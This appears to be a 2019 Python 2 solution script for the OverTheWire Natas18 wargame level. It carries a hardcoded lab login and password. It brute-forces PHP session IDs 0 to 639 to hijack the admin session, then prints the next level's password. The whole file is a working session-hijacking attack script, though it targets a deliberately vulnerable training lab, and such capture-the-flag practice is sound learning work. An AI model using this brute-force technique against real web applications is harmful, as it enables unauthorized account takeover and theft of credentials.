# Natas18 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas18.natas.labs.overthewire.org/"

auth_name = 'natas18'
auth_pass = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# A Cookie (PHPSESSID) has been set (with a value of 0-640)
# In the given Source-code, a variable 'MAX_ID' seems to indicate
# the maximum number of PHP session ID's.

#for x in range(0,640):
for x in range(0,640):
    COOKIES = dict(PHPSESSID=str(x))
    r = s.post(URL, cookies=COOKIES)

    if not 'You are logged in as a regular user' in r.text:
#         print "The correct session_id for admin is:",x
        for x in r.iter_lines():
            if "Password" in x:
                print x[0:42]
        break
